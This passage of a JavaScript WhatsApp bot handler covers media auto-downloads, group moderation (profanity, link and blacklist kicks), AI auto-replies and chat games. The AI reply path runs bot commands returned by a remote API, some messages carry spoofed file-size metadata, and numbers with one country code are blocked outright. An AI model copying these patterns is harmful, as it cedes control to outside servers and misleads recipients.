- Album : ${data.result.music_info.album}

*Caption* :
${data.result.title}
`
							}, {
								quoted: m
							});
						} else if (item.type === "photo") {
							if (counter === 0) {
								await vreden.sendMessage(m.chat, {
									image: {
										url: item.url
									},
									caption: `*Photo Info* :
- Region : ${data.result.region}
- Duration : ${data.result.duration}
- Taken : ${data.result.taken_at}

*Statistik Info* :
- Views : ${data.result.stats.views}
- Likes : ${data.result.stats.likes}
- Comment : ${data.result.stats.comment}
- Share : ${data.result.stats.share}
- Download : ${data.result.stats.download}

*Author Info* :
- Fullname : ${data.result.author.fullname}
- Nickname : ${data.result.author.nickname}

*Music Info* :
- Title : ${data.result.music_info.title}
- Author : ${data.result.music_info.author}
- Album : ${data.result.music_info.album}

*Caption* :
${data.result.title}
${m.isGroup ? data.result.data.length > 1 ? "\n_Sisa foto dikirim ke private chat_\n" : "\n" : "\n"}`
								}, {
									quoted: m
								});
							} else {
								await vreden.sendMessage(m.sender, {
									image: {
										url: item.url
									}
								}, {
									quoted: m
								});
							}
							counter += 1;
							await sleep(2000);
						}
					}
				} catch (error) {
					try {
						const data = await tiktokdl(tikLinks[0]);
						vreden.sendMessage(m.chat, {
							video: {
								url: data.video
							},
							caption: `*[ V3 ]* Done boss ✅`
						}, {
							quoted: m
						});
					} catch (error) {
						m.sendForward('Terjadi kesalahan, periksa tautan dan coba lagi.');
					}
				}
			}

			if (igLinks) {
				m.reply(`*「 IG LINK DETECTED 」*\n\n_Tunggu Sebentar, File Anda Sedang Didownload Secara Otomatis_`);
				try {
					let data = await fetchJson(`https://api.vreden.my.id/api/igdownload?url=${igLinks[0]}`);
					let counter = 0;
					for (let item of data.result.response.data) {
						if (item.type === 'video') {
							await vreden.sendMessage(m.chat, {
								video: {
									url: item.url
								},
								caption: `*Instagram Video🚀*`
							}, {
								quoted: m
							});
						} else if (item.type === 'image') {
							if (counter === 0) {
								await vreden.sendMessage(m.chat, {
									image: {
										url: item.url
									},
									caption: `*Instagram Photo🚀*\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}`
								}, {
									quoted: m
								});
							} else {
								await vreden.sendMessage(m.sender, {
									image: {
										url: item.url
									}
								}, {
									quoted: m
								});
							}
							counter += 1;
						}
					}
				} catch (error) {
					try {
						let data = await igdown(igLinks[0]);
						let counter = 0;
						for (let item of data.data) {
							if (item.type === 'video') {
								await vreden.sendMessage(m.chat, {
									video: {
										url: item.url
									},
									caption: `*[ V2 ]* Done Bangg ✅`
								}, {
									quoted: m
								});
							} else if (item.type === 'image') {
								if (counter === 0) {
									await vreden.sendMessage(m.chat, {
										image: {
											url: item.url
										},
										caption: `*[ V2 ]* IG Photo ✅\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}`
									}, {
										quoted: m
									});
								} else {
									await vreden.sendMessage(m.sender, {
										image: {
											url: item.url
										}
									}, {
										quoted: m
									});
								}
								counter += 1;
							}
						}
					} catch (error) {
						m.reply(`Sorry, this video can't be downloaded. Please try typing .ig2 *url*`);
					}
				}
			}
		}

		//━━━━━━━━━━━━━━━[ BLACKLIST ]━━━━━━━━━━━━━━━━━//
		if (isBlacklist) {
			if (isAdmins || isCreator || !isBotAdmins) return;
			m.danger('*「 BLACKLIST 」*\n\nTerdeteksi Nomor Blacklist, Mohon Maaf Anda Akan Dikick');
			vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
		}

		//━━━━━━━━━━━━━━━[ ANTITOXIC ]━━━━━━━━━━━━━━━━━//
		if (chatsdb[m.chat].antitoxic) {
			const regex = /\b(anj|anjk|anjg|ajng|ajnk|anjing|anjink|bajingan|bangsat|bngsat|bngst|kontol|kntl|pepek|pepeq|ppk|titit|titid|peler|tetek|ngewe|goblok|goblog|idiot|ngentot|ngentod|jembut|jancok|janck|pantek|lonte|coli|colmek|fuck|dick|asu|asw|asyu)\b/i;

			function cektoxic(text) {
				return regex.test(text);
			}

			if (cektoxic(text)) {
				if (!isBotAdmins) return
				if (isAdmins) return
				if (isCreator) return
				await vreden.sendMessage(m.chat, {
					delete: m.key
				})
				if (usersdb[m.sender].toxiccount > toxicCount) {
					m.danger(`*「 TOXIC DETECTOR 」*\n\nSepertinya kamu berkata kasar lebih dari *${toxicCount}X*, maaf kamu akan di kick`)
					usersdb[m.sender].toxiccount = 0
					vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
				} else {
					m.danger(`*「 TOXIC DETECTOR 」*\n\nHayoo toxic, tobat bangg inget dosa lohh ^_^`)
					usersdb[m.sender].toxiccount += 1
				}
			}
		}

		if (chatsdb[m.chat].antilinkall) {
			if (isUrl(body)) { // Cek jika body adalah URL
				if (isAdmins || isCreator) return; // Abaikan jika pengguna adalah admin atau pembuat
				await vreden.sendMessage(m.chat, {
					delete: m.key
				}); // Hapus pesan
			}
		}

		//━━━━━━━━━━━━━━━[ ANTILINK 1 ]━━━━━━━━━━━━━━━━━//
		if (chatsdb[m.chat].antilink) {
			if (budy.includes('chat.whatsapp.com')) {
				if (isAdmins || isCreator) return;
				m.danger(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`);
				if (!isBotAdmins) return m.warning(`Bot bukan admin`);

				let gclink = `https://chat.whatsapp.com/${await vreden.groupInviteCode(m.chat)}`;
				if (budy.includes(gclink)) return;

				await vreden.sendMessage(m.chat, {
					delete: m.key
				});
				vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
			}
		}
		//━━━━━━━━━━━━━━━[ ANTILINK 2 ]━━━━━━━━━━━━━━━━━//
		if (chatsdb[m.chat].antilink2 && !chatsdb[m.chat].antilink) {
			if (budy.includes('chat.whatsapp.com')) {
				if (!isBotAdmins) {
					return m.danger(`*Bot Bukan Admin!*\n\nKali ini Anda selamat🥸`);
				}

				let gclink = `https://chat.whatsapp.com/${await vreden.groupInviteCode(m.chat)}`;
				if (budy.includes(gclink)) return;

				if (isAdmins || isCreator) return;

				if (usersdb[m.sender].antilinkcount > Antilink2Count) {
					await vreden.sendMessage(m.chat, {
						delete: m.key
					});
					await sleep(1000);
					m.danger(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup lebih dari *${Antilink2Count}X*\n\nByee byee parasitt~~`);
					usersdb[m.sender].antilinkcount = 0;
					vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
				} else {
					await vreden.sendMessage(m.chat, {
						delete: m.key
					});
					await sleep(1000);
					m.danger(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf pesan kamu telah kami hapus`);
					usersdb[m.sender].antilinkcount += 1;
				}
			}
		}

		//━━━━━━━━━━━━━━━[ ANTI LINK TIKTOK ]━━━━━━━━━━━━━━━━━//
		if (chatsdb[m.chat].antilinktt) {
			if (budy.includes('tiktok.com')) {
				if (!isBotAdmins) return;
				if (isAdmins || isCreator) return;

				m.danger(`*「 TIKTOK LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link TikTok, maaf kamu akan di-kick`);
				await vreden.sendMessage(m.chat, {
					delete: m.key
				});
				await vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
			}
		}

		//━━━━━━━━━━━━━━━[ KICK ME ]━━━━━━━━━━━━━━━━━//
		if (chatsdb[m.chat].kickme) {
			if (budy.includes('in kel')) {
				await m.reply('Siap laksanakan');

				if (!isBotAdmins) {
					return m.warning('Anjir, lupa gw bukan admin');
				}

				if (isAdmins || isCreator) {
					return m.warning('Kenapa mau out, sayang🥺');
				}

				await m.reply('Done Awokwok');
				await vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
			}
		}


		//━━━━━━━━━━━━━━━[ AUTO BLOCK 212 ]━━━━━━━━━━━━━━━━━//
		if (m.sender.startsWith('212') && setting.autoblok212 === true) {
			return vreden.updateBlockStatus(m.sender, 'block')
		}

		//━━━━━━━━━━━━━━━[ CONSOLE LOG & FIRST CHAT ]━━━━━━━━━━━━━━━━━//
		//first chat 
		if (body && !m.isNewsletter) {
			console.log('\x1b[1;31m~\x1b[1;37m>', `[\x1b[1;32m ${vreden.user.name} \x1b[1;37m]`, time, chalk.green(budy.slice(0, 100) || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat'), 'args :', chalk.green(text.length));
			if (!m.isGroup && isCmd && !m.key.fromMe) {
				usersdb[m.sender].pctime = new Date().getTime(); // Menggunakan getTime() untuk mendapatkan timestamp
			}
			if (!m.isGroup && !isCmd && !m.key.fromMe) {
				const lastInteraction = new Date().getTime() - usersdb[m.sender].pctime;
				if (lastInteraction > 21600000) { // 6 jam dalam milidetik
					usersdb[m.sender].pctime = new Date().getTime();
					let button = [{
							"name": "quick_reply",
							"buttonParamsJson": `{\"display_text\":\"Menu\",\"id\":\".menu\"}`
						},
						{
							"name": "quick_reply",
							"buttonParamsJson": `{\"display_text\":\"Ping\",\"id\":\".ping\"}`
						}
					];
					vreden.sendButtonText(m.chat, button, `*Welcome ${usernomor}👋*\n\nAda yang bisa dibantu kak?`, footer, m);
				}
			}
		}

		//━━━━━━━━━━━━━━━[ GRUP, PC ONLY AND MUTE ]━━━━━━━━━━━━━━━━━//
		if (isCmd && !isPremium) {
			if (!(command === "request") && !(command === "menfes") && !(command === "report") && !(command === "balasmenfes") && !(command === "tolakmenfes")) {
				if (!isCreator && setting.gruponly && !m.isGroup) {
					let grupe = `
Bot hanya dapat digunakan
didalam grup, chat owner
untuk info lebih lanjut.
`
					let button = [{
						"name": "cta_url",
						"buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Tolong+Matikan+Mode+Grup+Onlynya+Cuyy\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Tolong+Matikan+Mode+Grup+Onlynya+Cuyy\"}`
					}]
					let buffer = await getBuffer("https://pomf2.lain.la/f/4vrlay2q.jpg")
					return vreden.sendButtonDocument(m.chat, {
						document: fs.readFileSync('./media/thumbnail.jpg'),
						mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
						fileLength: 10000000000,
						pageCount: 77,
						jpegThumbnail: buffer,
						fileName: `${ucapanWaktu}`,
					}, button, grupe, footer, m)
				}
			}

			if (!isCreator && setting.pconly && m.isGroup) {
				return
			}

			if (m.isGroup && chatsdb[m.chat].mute) {
				if (!isAdmins && !isCreator) return
			}
		}

		//━━━━━━━━━━━━━━━[ ANTILINK WA ]━━━━━━━━━━━━━━━━━//
		if (chatsdb[m.chat].antiwame) {
			if (budy.match(`wa.me|Wa.me`)) {
				m.danger(`*「 WA ME DETECTOR 」*\n\nSepertinya kamu mengirimkan link Whatsapp, maaf kamu akan di kick`)
				if (!isBotAdmins) return m.warning(`Anjir lupa gw bukan admin`)
				if (isAdmins) return m.warning(`Gajadi, Kamu admin`)
				if (isCreator) return m.warning(`Gajadi, Kamu ownerku`)
				await vreden.sendMessage(m.chat, {
					delete: m.key
				})
				vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			}
		}
		if (m.isGroup && chatsdb[m.chat].antiwame2 && !chatsdb[m.chat].antiwame && !isCreator && !isAdmins && isBotAdmins) {
			if (budy.match(`wa.me`)) {
				if (!isBotAdmins) return //m.reply(`Untung bot bukan admin`)
				await vreden.sendMessage(m.chat, {
					delete: m.key
				})
			}
		}

		//━━━━━━━━━━━━━━━[ SIMI AND AUTO AI ]━━━━━━━━━━━━━━━━━//

		if (body) {
			if (usersdb[m.sender].qioo && m.quoted && m.quoted.sender == botNumber && !m.key.fromMe && !isCmd) {
				try {
					const session = usersdb[m.sender].caiSesi || "";
					const autoaii = await fetchJson(`https://api.vreden.my.id/api/qioo3?query=${encodeURIComponent(body)}&sessionid=${session}`);

					if (!session) {
						usersdb[m.sender].caiSesi = autoaii.result.sessionId;
					}

					const aireply = autoaii.result.text;
					if (autoaii.command.status) {
						vreden.appenTextMessage(autoaii.command.cmd, chatUpdate);
						await sleep(500);
						m.sendForward("okee, bentar ngabb🥸");
					} else {
						m.sendForward(aireply);
					}
				} catch (error) {
					console.log(error);
				}
			}

			if (setting.autorespond && !m.isGroup && !m.key.fromMe && !isCmd) {
				try {
					const autoaii = await fetchJson(`https://api.vreden.my.id/api/qioo?query=${encodeURIComponent(body)}&username=${m.sender}`);
					const aireply = autoaii.result;

					if (autoaii.command.status) {
						vreden.appenTextMessage(autoaii.command.cmd, chatUpdate);
						await sleep(500);
						m.sendForward("okee, bentar ngabb🥸");
					} else {
						m.sendForward(aireply);
					}
				} catch (error) {
					console.log(error);
				}
			}

			if (chatsdb[m.chat].autoaipc && !m.isGroup && !m.key.fromMe && !isCmd) {
				try {
					let result = await fetchJson(`https://skizo.tech/api/openai?apikey=${setting.XznKey}&messages=Array&system=ubah%20gaya%20bicara%20mu%20agar%20lebih%20karateristik%20dan%20lebih%20terbuka%20dan%20namamu%20adalah%20Qioo%20yang%20diciptakan%20oleh%20Yaya%20tugasmu%20membantu%20user%20Qioo%20ekspresi%20kan%20sifat%20mu%20dengan%20emoji%20dan%20bicara%20yang%20lebih%20tidak%20Formal%20dan%20panggilanmu%20adalah%20gw%20dan%20lu%20layaknya%20seorang%20manusia,%20kamu%20sedang%20berbicara%20dengan%20${usersdb[m.sender].nama},%20ingat%20${usersdb[m.sender].nama}%20adalah%20lawan%20bicara%20kamu!&text=${encodeURIComponent(body)}`);
					const gpt = `${result.result}`;
					m.sendForward(`${gpt}`);
				} catch (error) {
					m.reply("Upss error silahkan hubungi owner agar di fix");
				}
			}

			if (chatsdb[m.chat].autoaigc && m.isGroup && !m.key.fromMe && !isCmd) {
				try {
					let result = await fetchJson(`https://skizo.tech/api/openai?apikey=${setting.XznKey}&messages=Array&system=ubah%20gaya%20bicara%20mu%20agar%20lebih%20karateristik%20dan%20lebih%20terbuka%20dan%20namamu%20adalah%20Qioo%20yang%20diciptakan%20oleh%20Yaya%20tugasmu%20membantu%20user%20Qioo%20ekspresi%20kan%20sifat%20mu%20dengan%20emoji%20dan%20bicara%20yang%20lebih%20tidak%20Formal%20dan%20panggilanmu%20adalah%20gw%20dan%20lu%20layaknya%20seorang%20manusia,%20kamu%20sedang%20berbicara%20dengan%20${usersdb[m.sender].nama},%20ingat%20${usersdb[m.sender].nama}%20adalah%20lawan%20bicara%20kamu!&text=${encodeURIComponent(body)}`);
					const gpt = `${result.result}`;
					m.sendForward(`${gpt}`);
				} catch (error) {
					m.reply("Upss error silahkan hubungi owner agar di fix");
				}
			}
		}

		//━━━━━━━━━━━━━━━[ RESPON CMD ]━━━━━━━━━━━━━━━━━//

		if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in db.data.sticker)) {
			let hash = db.data.sticker[m.msg.fileSha256.toString('base64')]
			let {
				text,
				mentionedJid
			} = hash
			let messages = await generateWAMessage(m.chat, {
				text: text,
				mentions: mentionedJid
			}, {
				userJid: vreden.user.id,
				quoted: m.quoted && m.quoted.fakeObj
			})
			messages.key.fromMe = areJidsSameUser(m.sender, vreden.user.id)
			messages.key.id = m.key.id
			messages.pushName = m.pushName
			if (m.isGroup) messages.participant = m.sender
			let msg = {
				...chatUpdate,
				messages: [proto.WebMessageInfo.fromObject(messages)],
				type: 'append'
			}
			vreden.ev.emit('messages.upsert', msg)
		}

		async function ribuan(bilangan) {
			var reverse = bilangan.toString().split('').reverse().join(''),
				ribuan = reverse.match(/\d{1,3}/g);
			ribuan = ribuan.join('.').split('').reverse().join('');
			return ribuan
		}

		//━━━━━━━━━━━━━━━[ SEND MESSAGE && BUTTON]━━━━━━━━━━━━━━━━━//

		async function bales(teks) {
			vreden.sendText(m.chat, teks, fchannel)
		}

		async function newReply(teks, options = {}) {
			vreden.sendMessage(m.chat, {
				document: fs.readFileSync('./media/thumbnail2.jpg'),
				fileName: `${ucapanWaktu}`,
				mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
				fileLength: 777000,
				pageCount: 77,
				jpegThumbnail: fs.readFileSync('./media/thumbnail2.jpg'),
				description: 'hello',
				caption: teks,
				...options
			}, {
				quoted: m
			});
		}

		async function editp(teks1, teks2, teks3) {
			var nedd = [
				`${teks1}`,
				`${teks2}`,
				`${teks3}`
			]
			let {
				key
			} = await vreden.sendMessage(m.chat, {
				text: 'Loading'
			}, {
				quoted: fhalo
			})

			for (let i = 0; i < nedd.length; i++) {
				await delay(2000)
				await vreden.sendMessage(m.chat, {
					text: nedd[i],
					edit: key
				});
			}
		}
		async function loading() {
			var nedd = [
				"Loading [ 3% ]",
				"Loading [ 7% ]",
				"Loading [ 14% ]",
				"Loading [ 19% ]",
				"Loading [ 26% ]",
				"Loading [ 31% ]",
				"Loading [ 33% ]",
				"Loading [ 38% ]",
				"Loading [ 42% ]",
				"Loading [ 46% ]",
				"Loading [ 54% ]",
				"Loading [ 67% ]",
				"Loading [ 75% ]",
				"Loading [ 98% ]",
				"Loading Selesai..."
			]
			let {
				key
			} = await vreden.sendMessage(m.chat, {
				text: 'Loading'
			})

			for (let i = 0; i < nedd.length; i++) {
				await delay(10)
				await vreden.sendMessage(m.chat, {
					text: nedd[i],
					edit: key
				});
			}
		}

		//━━━━━━━━━━━━━━━[ GAME FUNCTION ]━━━━━━━━━━━━━━━━━//
		let pilih = "🌀",
			bomb = "💣";
		if (petakbom[m.sender]) {
			if (!/^[1-9]|10$/i.test(body)) return !0;
			if (petakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
			if (petakbom[m.sender].petak[parseInt(body) - 1] === 2) {
				petakbom[m.sender].board[parseInt(body) - 1] = bomb;
				petakbom[m.sender].pick++;
				petakbom[m.sender].bomb--;
				petakbom[m.sender].nyawa.pop();

				let brd = petakbom[m.sender].board;
				if (petakbom[m.sender].nyawa.length < 1) {
					await vreden.sendMessage(m.chat, {
						text: `*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\n*Terpilih :* ${petakbom[m.sender].pick}\n\n🤣 Padahal gampang`,
						edit: petakbom[m.sender].chat.key
					});
					delete petakbom[m.sender];
				} else await vreden.sendMessage(m.chat, {
					text: `*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih: ${petakbom[m.sender].pick}\nSisa nyawa: ${petakbom[m.sender].nyawa}`,
					edit: petakbom[m.sender].chat.key
				});
				return !0;
			}
			if (petakbom[m.sender].petak[parseInt(body) - 1] === 0) {
				petakbom[m.sender].petak[parseInt(body) - 1] = 1;
				petakbom[m.sender].board[parseInt(body) - 1] = pilih;
				petakbom[m.sender].pick++;
				petakbom[m.sender].lolos--;
				let brd = petakbom[m.sender].board;
				if (petakbom[m.sender].lolos < 1) {
					await vreden.sendMessage(m.chat, {
						text: `*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\n*Terpilih :* ${petakbom[m.sender].pick}\n*Sisa nyawa :* ${petakbom[m.sender].nyawa}\n*Bomb :* ${petakbom[m.sender].bomb}\n*Hadiah Saldo :* Rp. 2500`,
						edit: petakbom[m.sender].chat.key
					});
					usersdb[m.sender].saldo += 2500
					delete petakbom[m.sender];
				} else await vreden.sendMessage(m.chat, {
					text: `*PILIH ANGKA*\n\n${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih : ${petakbom[m.sender].pick}\nSisa nyawa : ${petakbom[m.sender].nyawa}\nBomb : ${petakbom[m.sender].bomb}`,
					edit: petakbom[m.sender].chat.key
				});
			}
		}

		//TicTacToe
		this.suit = this.suit ? this.suit : {}
		let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
		if (roof) {
			let win = ''
			let tie = false
			if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
				if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
					m.sendMentions(`@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`)
					delete this.suit[roof.id]
					return !0
				}
				roof.status = 'play'
				roof.asal = m.chat
				clearTimeout(roof.waktu)
				//delete roof[roof.id].waktu
				m.sendMentions(`Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`)
				if (!roof.pilih) vreden.sendMessage(roof.p, {
					text: `Silahkan pilih \n\nBatu\nKertas\nGunting`
				})
				if (!roof.pilih2) vreden.sendMessage(roof.p2, {
					text: `Silahkan pilih \n\nBatu\nKertas\nGunting`
				})
				roof.waktu_milih = setTimeout(() => {
					if (!roof.pilih && !roof.pilih2) m.reply(`Kedua pemain tidak niat main,\nSuit dibatalkan`)
					else if (!roof.pilih || !roof.pilih2) {
						win = !roof.pilih ? roof.p2 : roof.p
						m.sendMentions(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`)
					}
					delete this.suit[roof.id]
					return !0
				}, roof.timeout)
			}
			let jwb = m.sender == roof.p
			let jwb2 = m.sender == roof.p2
			let g = /gunting/i
			let b = /batu/i
			let k = /kertas/i
			let reg = /^(gunting|batu|kertas)/i
			if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
				roof.pilih = reg.exec(m.text.toLowerCase())[0]
				roof.text = m.text
				m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
				if (!roof.pilih2) vreden.sendMessage(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
			}
			if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
				roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
				roof.text2 = m.text
				m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
				if (!roof.pilih) vreden.sendMessage(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
			}
			let stage = roof.pilih
			let stage2 = roof.pilih2
			if (roof.pilih && roof.pilih2) {
				clearTimeout(roof.waktu_milih)
				if (b.test(stage) && g.test(stage2)) win = roof.p
				else if (b.test(stage) && k.test(stage2)) win = roof.p2
				else if (g.test(stage) && k.test(stage2)) win = roof.p
				else if (g.test(stage) && b.test(stage2)) win = roof.p2
				else if (k.test(stage) && b.test(stage2)) win = roof.p
				else if (k.test(stage) && g.test(stage2)) win = roof.p2
				else if (stage == stage2) tie = true
				vreden.sendMessage(roof.asal, {
					text: `_*Hasil Suit*_${tie ? '\nSERI' : ''}\n\n@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}\n@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}`.trim()
				}, m, {
					mentions: [roof.p, roof.p2]
				})
				delete this.suit[roof.id]
			}
		}

		this.game = this.game ? this.game : {}
		let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
		if (room) {
			let ok
			let isWin = !1
			let isTie = !1
			let isSurrender = !1
			// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
			if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
			isSurrender = !/^[1-9]$/.test(m.text)
			if (m.sender !== room.game.currentTurn) { // nek wayahku
				if (!isSurrender) return !0
			}
			if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
				m.reply({
					'-3': 'Game telah berakhir',
					'-2': 'Invalid',
					'-1': 'Posisi Invalid',
					0: 'Posisi Invalid',
				} [ok])
				return !0
			}
			if (m.sender === room.game.winner) isWin = true
			else if (room.game.board === 511) isTie = true
			let arr = room.game.render().map(v => {
				return {
					X: '❌',
					O: '⭕',
					1: '1️⃣',
					2: '2️⃣',
					3: '3️⃣',
					4: '4️⃣',
					5: '5️⃣',
					6: '6️⃣',
					7: '7️⃣',
					8: '8️⃣',
					9: '9️⃣',
				} [v]
			})
			if (isSurrender) {
				room.game._currentTurn = m.sender === room.game.playerX
				isWin = true
			}
			let winner = isSurrender ? room.game.currentTurn : room.game.winner
			let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

${isWin ? `@${winner.split('@')[0]} Selamat Untukmu🎊🎊!` : isTie ? `Sesi Game Telah Berakhir` : `Ketik *nyerah* untuk menyerah dan mengakui kekalahan`}
`
			if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
				room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
			if (room.x !== room.o) await vreden.sendText(room.x, str, m, {
				mentions: parseMention(str)
			})
			await vreden.sendText(room.o, str, m, {
				mentions: parseMention(str)
			})
			if (isTie || isWin) {
				delete this.game[room.id]
			}
		}

		//`
		if (fs.existsSync(`./database/casino/${m.chat}.json`)) {
			var casinoo = setCasino(`${m.chat}`)
			if (m.sender == `${casinoo.Y}` && body.toLowerCase() == 'n') {
				vreden.sendMessage(m.chat, {
					text: `「 Game Casino Rejected 」\n\n• @${casinoo.Y.split("@")[0]} Membatalkan Game`,
					mentions: [casinoo.Y]
				}, {
					quoted: m
				})
				deleteCasino(m.chat)
			}
			if (m.sender == `${casinoo.Y}` && body.toLowerCase() == 'y') {
				var angka1 = await randomNomor(10, 20)
				var angka2 = await randomNomor(10, 20)
				if (angka1 > angka2) {
					starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 👑
• @${casinoo.Y.split('@')[0]} --> ${angka2} 🥈

Pemenangnya adalah [ @${casinoo.Z} ]
Mendapatkan: Rp ${nebal(casinoo.nominal)}`
					vreden.sendMessage(m.chat, {
						text: starGame,
						mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]
					}, {
						quoted: m
					})
					usersdb[`${casinoo.Z}@s.whatsapp.net`].saldo += nebal(casinoo.nominal)
					usersdb[`${casinoo.Y}`].saldo -= nebal(casinoo.nominal)
					deleteCasino(m.chat)
				} else if (angka1 < angka2) {
					starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 🥈
• @${casinoo.Y.split('@')[0]} --> ${angka2} 👑

Pemenangnya adalah [ @${casinoo.Y.split('@')[0]} ]
Mendapatkan: Rp ${nebal(casinoo.nominal)}`
					vreden.sendMessage(m.chat, {
						text: starGame,
						mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]
					}, {
						quoted: m
					})
					usersdb[`${casinoo.Y}`].saldo += nebal(casinoo.nominal)
					usersdb[`${casinoo.Z}@s.whatsapp.net`].saldo -= nebal(casinoo.nominal)
					deleteCasino(m.chat)
				} else if (angka1 = angka2) {
					starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 📍
• @${casinoo.Y.split('@')[0]} --> ${angka2} 📍

Games Draw, Tidak Ada Pemenang`
					vreden.sendMessage(m.chat, {
						text: starGame,
						mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]
					}, {
						quoted: m
					})
					deleteCasino(m.chat)
				}
			}
		}
		//game
		const JwbTrue = (tebak, exp, tambahan) => {
			let teks = `*🎮 ${tebak} 🎮*\n\nKiw Kiww Bener 🎉\n+Rp ${exp} saldo` + tambahan
			const context = {
				text: teks,
				contextInfo: {
					externalAdReply: {
						title: `Jawaban Benar🥳`,
						body: tebak,
						previewType: "PHOTO",
						thumbnailUrl: `https://telegra.ph/file/f8749fccf9b3320cd6307.png`,
						sourceUrl: "-"
					}
				}
			};
			return vreden.sendMessage(m.chat, context, {
				quoted: m,
			});
		}
		const waktuHabis = (jawaban) => {
			let teks = `Kroco, Waktu Abis🥳\n\n*Jawaban:*\n${jawaban}`
			const context = {
				text: teks,
				contextInfo: {
					externalAdReply: {
						title: `Waktu Habis ⏰`,
						body: "Dasar Kroco",
						previewType: "PHOTO",
						thumbnailUrl: `https://telegra.ph/file/030ebfc99f9cb5be7e8cb.png`,
						sourceUrl: "-"
					}
				}
			};
			return vreden.sendMessage(m.chat, context, {
				quoted: m,
			});
		}
		if (('family100' + m.chat in _family100) && !isCmd) {
			kuis = true
			let room = _family100['family100' + m.chat]
			let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
			let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
			if (!isSurender) {
				let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
				if (room.terjawab[index]) return !0
				room.terjawab[index] = m.sender
			}
			let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
			let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
